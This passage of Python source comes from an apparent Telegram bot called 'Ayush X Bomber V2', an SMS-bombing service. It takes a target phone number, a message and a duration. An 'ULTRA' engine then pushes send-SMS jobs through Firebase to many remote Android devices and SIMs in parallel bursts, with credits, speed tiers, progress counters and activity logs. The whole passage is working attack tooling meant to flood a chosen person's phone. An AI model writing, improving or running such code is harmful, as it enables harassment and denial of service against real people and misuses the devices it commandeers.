        await cq.answer("❌ Invalid!", show_alert=True)
        return

    fsmd = await state.get_data()
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    if not devices:
        await cq.message.edit_text(f"😴 <b>No APIs online!</b> Try later.", reply_markup=kb([("🏠 Owner", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_timed(cq.bot, cq.message, uid, number, message_text, duration_secs, devices, send_speed)

@R.message(S.owner_send_duration_custom)
async def owner_got_custom_duration(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        mins = float(msg.text.strip())
        if mins <= 0: raise ValueError
        duration_secs = int(mins * 60)
    except:
        await msg.answer("❌ Enter a valid number of minutes (e.g. 30):", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"😴 <b>No APIs online!</b> Try later.", parse_mode="HTML")
        return
    await run_sms_blast_timed(msg.bot, msg, uid, number, message_text, duration_secs, devices, send_speed)

@R.callback_query(F.data.startswith("admin:dur:"))
async def admin_duration_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return

    part = cq.data.split("admin:dur:")[1]
    if part == "custom":
        await state.set_state(S.admin_send_duration_custom)
        await cq.message.edit_text(
            f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
            f"<b>✍️ CUSTOM DURATION</b>\n\n"
            f"Enter duration in <b>minutes</b>:",
            reply_markup=kb([("❌ Cᴀɴᴄᴇʟ", "admin:home")]),
            parse_mode="HTML"
        )
        return

    try:
        duration_secs = int(part)
    except:
        await cq.answer("❌ Invalid!", show_alert=True)
        return

    fsmd = await state.get_data()
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await cq.message.edit_text(f"😴 <b>No APIs online!</b> Try later.", parse_mode="HTML")
        return
    await run_sms_blast_timed(cq.bot, cq.message, uid, number, message_text, duration_secs, devices, send_speed)

@R.message(S.admin_send_duration_custom)
async def admin_got_custom_duration(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        mins = float(msg.text.strip())
        if mins <= 0: raise ValueError
        duration_secs = int(mins * 60)
    except:
        await msg.answer("❌ Enter a valid number of minutes:", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"😴 <b>No APIs online!</b>", parse_mode="HTML")
        return
    await run_sms_blast_timed(msg.bot, msg, uid, number, message_text, duration_secs, devices, send_speed)



# ===== ULTRA PARALLEL SMS SENDER =====
async def ultra_send_sms(session: "aiohttp.ClientSession", fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    """Fire SMS via Firebase REST API PUT. Returns True on success."""
    url = fb_url.rstrip("/") + f"/clients/{dev_id}/webhookEvent/sendSms.json"
    payload = {
        "from": sim_slot,
        "to": to.strip(),
        "message": message.strip(),
        "isSended": False,
        "timestamp": int(time.time())
    }
    for attempt in range(3):
        try:
            async with session.put(url, json=payload,
                                   timeout=aiohttp.ClientTimeout(total=_ULTRA_FB_TIMEOUT),
                                   ssl=True) as r:
                if 200 <= r.status < 300:
                    return True
                if attempt == 0:
                    body = (await r.text())[:120]
                    log.warning(f"[SMS-FAIL] HTTP {r.status} | {url[:55]} | {body}")
        except asyncio.TimeoutError:
            log.warning(f"[SMS-TIMEOUT] dev={dev_id[:10]} attempt={attempt+1}")
        except Exception as e:
            log.warning(f"[SMS-ERR] dev={dev_id[:10]}: {type(e).__name__}: {e}")
        if attempt < 2:
            await asyncio.sleep(0.2 * (attempt + 1))
    return False


async def test_firebase_write(fb_url: str) -> tuple:
    """Test a single Firebase URL — returns (ok: bool, status: int, body: str)."""
    test_path = "/clients/__test_ping__/webhookEvent/sendSms.json"
    url = fb_url.rstrip("/") + test_path
    payload = {"from": 0, "to": "test", "message": "ping", "isSended": False, "timestamp": int(time.time())}
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=8), ssl=True) as r:
                body = (await r.text())[:200]
                return 200 <= r.status < 300, r.status, body
    except Exception as e:
        return False, 0, str(e)[:200]


async def run_ultra_blast(
    bot: "Bot",
    chat_id: int,
    uid: int,
    number: str,
    message: str,
    duration_secs: int,
    devices: list,
    progress_msg_id: int,
    session_obj: "UserSession",
    speed_label: str = "⚡ TURBO"
):
    """
    Main ULTRA ENGINE:
    - Opens ONE shared aiohttp session for all requests
    - Each burst: fires ALL devices * sims simultaneously via asyncio.gather
    - Semaphore limits concurrency to _ULTRA_SEM_LIMIT
    - Loops continuously until end_time or session cancelled
    """
    import time as _time

    end_time = _time.time() + duration_secs
    total_sent = 0
    total_failed = 0
    burst_count = 0
    start_time = _time.time()
    sem = asyncio.Semaphore(_ULTRA_SEM_LIMIT)
    last_edit = _time.time()

    # Build flat task list: (fb_url, dev_id, sim_slot)
    targets = []
    for dev in devices:
        fb_url = dev["fb_url"]
        dev_id = dev["dev_id"]
        sims = dev.get("sims", [])
        sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
        for sim in sim_slots:
            targets.append((fb_url, dev_id, sim))

    if not targets:
        return 0, 0

    # === DIAGNOSTIC: test first device before full blast ===
    _diag_fb_url, _diag_dev_id, _diag_sim = targets[0]
    _diag_ok, _diag_status, _diag_body = await test_firebase_write(_diag_fb_url)
    log.info(f"[DIAG] Firebase write test → ok={_diag_ok} HTTP={_diag_status} body={_diag_body[:80]}")
    try:
        await bot.send_message(
            MAIN_OWNER,
            f"🔬 <b>Firebase Write Test</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"{'✅' if _diag_ok else '❌'} <b>Status:</b> HTTP <code>{_diag_status}</code>\n"
            f"📄 <b>Response:</b> <code>{_diag_body[:100]}</code>\n"
            f"🌐 <b>FB URL:</b> <code>{_diag_fb_url[:50]}</code>\n"
            f"{'🟢 Firebase writes OK!' if _diag_ok else '🔴 Firebase write BLOCKED — check DB rules!'}",
            parse_mode="HTML"
        )
    except Exception:
        pass
    # ======================================================

    def time_bar(elapsed: float, total: float, width: int = 12) -> str:
        filled = min(width, int(width * elapsed / total)) if total > 0 else 0
        return "▰" * filled + "▱" * (width - filled)

    async def _guarded_send(sess, fb_url, dev_id, sim):
        async with sem:
            return await ultra_send_sms(sess, fb_url, dev_id, sim, number, message)

    connector = aiohttp.TCPConnector(limit=400, ssl=True, enable_cleanup_closed=True, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as sess:
        while _time.time() < end_time:
            async with session_obj.lock:
                if session_obj.cancelled:
                    break

            # Fire ALL targets in parallel
            tasks = [_guarded_send(sess, fb_url, dev_id, sim) for fb_url, dev_id, sim in targets]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            ok = sum(1 for r in results if r is True)
            fail = sum(1 for r in results if r is not True)
            total_sent  += ok
            total_failed += fail
            burst_count += 1

            # Update progress every 1 second
            now = _time.time()
            if now - last_edit >= 1.0:
                elapsed = now - start_time
                remaining = max(0, int(end_time - now))
                rate = int(total_sent / elapsed) if elapsed > 0 else 0
                tbar = time_bar(elapsed, duration_secs)
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg_id,
                        text=(
                            f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b> — 🔥 ULTRA BLAST\n"
                            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                            f"🎯 <b>Target</b>  » <code>{mask_number(number)}</code>\n"
                            f"⚡ <b>Speed</b>   » {speed_label}\n"
                            f"📡 <b>Devices</b> » <b>{len(devices)}</b> | Targets: <b>{len(targets)}</b>\n"
                            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                            f"✅ <b>Total Hit</b> » <b>{total_sent:,}</b> SMS\n"
                            f"❌ <b>Failed</b>   » <b>{total_failed:,}</b>\n"
                            f"🚀 <b>Rate</b>     » <b>{rate:,}</b> SMS/sec\n"
                            f"🔄 <b>Bursts</b>   » <b>{burst_count:,}</b>\n"
                            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
                            f"⏱ <code>{tbar}</code> {fmt_duration(remaining)} left\n"
                            f"🛑 <i>Press Stop to cancel</i>"
                        ),
                        reply_markup=stop_send_kb(),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
                last_edit = now

            # Tiny sleep to yield event loop
            await asyncio.sleep(_ULTRA_BURST_SLEEP)

    return total_sent, total_failed
# ===== END ULTRA ENGINE =====

async def run_sms_blast_timed(bot: Bot, msg_or_cq, uid: int, number: str, message: str, duration_secs: int, devices: list, speed: float = SPEED_DEFAULT):
    """Timed blast using ULTRA parallel engine — hits all devices every burst simultaneously."""
    if hasattr(msg_or_cq, 'chat'):
        chat_msg = msg_or_cq
    else:
        chat_msg = msg_or_cq

    await send_random_video(bot, chat_msg.chat.id,
        caption=f"💣 <b>ULTRA Blast Starting on {mask_number(number)}!</b>\n"
                f"⏱ Duration: <b>{fmt_duration(duration_secs)}</b>\n"
                f"📡 Devices: <b>{len(devices)}</b> | Targets: <b>{sum(len(d.get('sims') or [1]) for d in devices)}</b>\n"
                f"🔥 Mode: <b>ULTRA PARALLEL — All devices simultaneously</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                try:
                    await bot.send_message(uid,
                        f"⚠️ <b>Blast already running!</b> Stop it first.",
                        parse_mode="HTML")
                except Exception:
                    pass
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    start_time = time.time()

    # Send initial progress message
    try:
        progress_msg = await bot.send_message(
            chat_msg.chat.id,
            f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b> — 🔥 ULTRA BLAST\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"🎯 <b>Target</b>  » <code>{mask_number(number)}</code>\n"
            f"📡 <b>Devices</b> » <b>{len(devices)}</b>\n"
            f"⏱ <b>Duration</b> » <b>{fmt_duration(duration_secs)}</b>\n"
            f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
            f"🚀 <i>ULTRA engine warming up...</i>\n"
            f"🛑 <i>Press Stop to cancel</i>",
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Progress msg failed: {e}")
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    async def _run():
        sent, failed = await run_ultra_blast(
            bot=bot,
            chat_id=chat_msg.chat.id,
            uid=uid,
            number=number,
            message=message,
            duration_secs=duration_secs,
            devices=devices,
            progress_msg_id=progress_msg.message_id,
            session_obj=session,
            speed_label="🔥 ULTRA TURBO"
        )
        async with session.lock:
            session.sent = sent
            session.failed = failed

    task = asyncio.create_task(_run())
    session.task = task
    await task

    was_cancelled = session.cancelled
    total_sent  = session.sent
    total_failed = session.failed

    async with SESSIONS_LOCK:
        USER_SESSIONS.pop(uid, None)

    duration_actual = int(time.time() - start_time)
    rate = int(total_sent / duration_actual) if duration_actual > 0 else 0

    # Save stats
    d_final = load()
    d_final["stats"]["total_sent"]   = d_final["stats"].get("total_sent", 0)   + total_sent
    d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + total_failed
    k = str(uid)
    if k in d_final["users"]:
        d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + total_sent
    log_activity(d_final, "ultra_blast", uid,
        f"Sent:{total_sent} Failed:{total_failed} Rate:{rate}/s Duration:{fmt_duration(duration_actual)}")
    save(d_final)

    icon = "✅" if total_sent > 0 else "❌"
    stopped_text = "\n🛑 <b>Stopped by user</b>" if was_cancelled else ""
    if is_owner(uid, load()):
        back_kb = kb([("🔙 Owner Panel", "owner:home")])
    elif is_admin(uid, load()):
        back_kb = kb([("🔙 Admin Panel", "admin:home")])
    else:
        back_kb = kb([("🚀 Blast Again", "user:send"), ("🏠 Home", "user:home")])

    completion_text = (
        f"{icon} <b>ULTRA Blast Complete!</b>{stopped_text}\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"🎯 <b>Target</b>   » <code>{mask_number(number)}</code>\n"
        f"⏱ <b>Duration</b> » <b>{fmt_duration(duration_actual)}</b>\n"
        f"✅ <b>Total Hit</b> » <b>{total_sent:,}</b> SMS\n"
        f"❌ <b>Failed</b>   » <b>{total_failed:,}</b>\n"
        f"🚀 <b>Avg Rate</b> » <b>{rate:,}</b> SMS/sec\n"
        f"📡 <b>Devices</b>  » <b>{len(devices)}</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"{'🔔 <i>Bombing session finished!</i>' if total_sent > 0 else '⚠️ <i>0 SMS sent — check Firebase connection!</i>'}"
    )

    try:
        await progress_msg.edit_text(
            completion_text,
            reply_markup=back_kb,
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Final edit of progress_msg failed: {e}")

    # Guaranteed notification to user
    try:
        await bot.send_message(
            chat_id=chat_msg.chat.id,
            text=f"🔔 <b>BOMBING COMPLETED!</b>\n\n🎯 Target <code>{mask_number(number)}</code> pe blast pura complete ho chuka hai! Total <b>{total_sent:,}</b> SMS deliver hue.",
            reply_markup=back_kb,
            parse_mode="HTML"
        )
    except Exception as e:
        log.warning(f"Completion alert message failed: {e}")


async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing Started on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>\n"
                    f"Pehle woh khatam hone do ya stop karein.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]

        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None

    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break

                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break

                fb_id = device["fb_id"]
                fb_url = device["fb_url"]
                dev_id = device["dev_id"]
                sims = device["sims"]
                sim_slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                device_quota = min(3, msgs_left)
                device_sent = 0

                for sim in sim_slots:
                    async with session.lock:
                        if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                            break

                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)

                    async with session.lock:
                        if ok:
                            sent_ok += 1
                            device_sent += 1
                            msgs_left -= 1

                            if is_regular_user:
                                d_temp = load()
                                deduct_credits(uid, 1, d_temp)
                                d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in d_temp["users"]:
                                    d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                        else:
                            sent_fail += 1
                            msgs_left -= 1

                        if fb_id not in api_usage_delta:
                            api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                        api_usage_delta[fb_id]["sent" if ok else "failed"] += 1

                        now = time.time()
                        if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or
                            session.cancelled):

                            current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                            try:
                                await progress_msg.edit_text(
                                    progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML"
                                )
                            except TelegramBadRequest:
                                pass
                            last_update_time = now

                    await asyncio.sleep(speed)

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 <b>SMS BLAST ACTIVITY LOG</b>\n\n"
        f"👤 <b>User:</b> {u_name}\n"
        f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
        f"🌐 <b>Username:</b> {u_uname}\n"
        f"📞 <b>Target Number:</b> <code>{number}</code>\n"
        f"💬 <b>Message:</b> <code>{message}</code>\n"
        f"✅ <b>Sent:</b> <b>{sent_ok}</b>\n"
        f"❌ <b>Failed:</b> <b>{sent_fail}</b>\n"
        f"📊 <b>Requested Count:</b> <b>{count}</b>\n"
        f"⏱ <b>Duration:</b> <b>{fmt_duration(duration)}</b>\n"
        f"🛑 <b>Status:</b> {'STOPPED BY USER' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = em(EMOJI_CHECK, "✅")
    elif sent_ok > 0:
        icon = em(EMOJI_WARNING, "⚠️")
    else:
        icon = em(EMOJI_CROSS, "❌")

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Credits Used: <b>{sent_ok}</b>\n{em(EMOJI_MONEY, '💳')} Remaining: <b>{remaining}</b>"

    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User ne beech mein stop kiya!</b>" if was_cancelled else ""
    duration_text = f"\n{em(EMOJI_GEAR, '⏱')} Duration: <b>{fmt_duration(int(time.time() - start_time))}</b>"

    if is_owner(uid, load()):
        back_btn = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()):
        back_btn = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else:
        back_btn = [btn("sᴇɴᴅ ᴀɴᴏᴛʜᴇʀ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]

    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Message: <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs used: <b>{len(api_usage_delta)}</b>"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id

    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ Sending already complete ya koi active sending nahi!", show_alert=True)
            return
        session.cancelled = True

    await cq.answer("🛑 Stop signal bhej diya! Thodi der mein sending ruk jayegi...", show_alert=True)

    try:
        async with session.lock:
            current_sent = session.sent
            current_failed = session.failed
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🛑')} <b>Stopping...</b>\n\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{current_sent}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{current_failed}</b>\n\n"
            f"<i>Current sending complete hone ke baad ruk jayega...</i>",
            parse_mode="HTML"
        )
    except Exception:
        pass

@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal Videos Saved: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nTelegram par video bhejiyega ya URL/File ID send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return

    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()

    if not video_file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Video send karein.", parse_mode="HTML")
        return

    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Video Saved Successfully!</b>",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Video Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All Videos Deleted Bulk Mode!", show_alert=True)
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery, state: FSMContext):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("❌ Abhi koi video available nahi hai!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_VIDEO, '📹')} Enjoy your video!")

@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(
        f"{em(EMOJI_LOCK, '🔒')} <b>Protect Number</b>\n\n"
        f"Jis number ko protect karna hai woh enter karo:\n"
        f"<i>Example: +919876543210</i>\n\n"
        f"Protected number sirf Owner/Super Admin hi use kar sakte hain.",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return

    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    PROTECTED_NUMBERS[number] = uid
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)

    await state.clear()
    await msg.answer(
        f"{em(EMOJI_LOCK, '🔒')} <b>Number Protected!</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <code>{number}</code>\n"
        f"{em(EMOJI_CROWN, '👤')} Protected by: <code>{uid}</code>\n\n"
        f"Ab sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

    log_activity(d, "number_protected", uid, f"Protected {number}")

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return

    protected = d.get("protected_numbers", {})

    if not protected:
        await cq.message.edit_text(
            f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"
            f"{em(EMOJI_CROSS, '❌')} <i>Koi number protected nahi hai.</i>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
        return

    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)

    for number, protector_uid in protected.items():
        if is_owner_user:
            display_number = number
        else:
            display_number = mask_number(number)

        protector_data = d.get("users", {}).get(str(protector_uid), {})
        protector_name = protector_data.get("name", "Unknown")

        lines.append(
            f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code>\n"
            f"   {em(EMOJI_LOCK, '🔒')} Protected by: <code>{protector_uid}</code> ({protector_name})\n"
        )

    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])

    await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
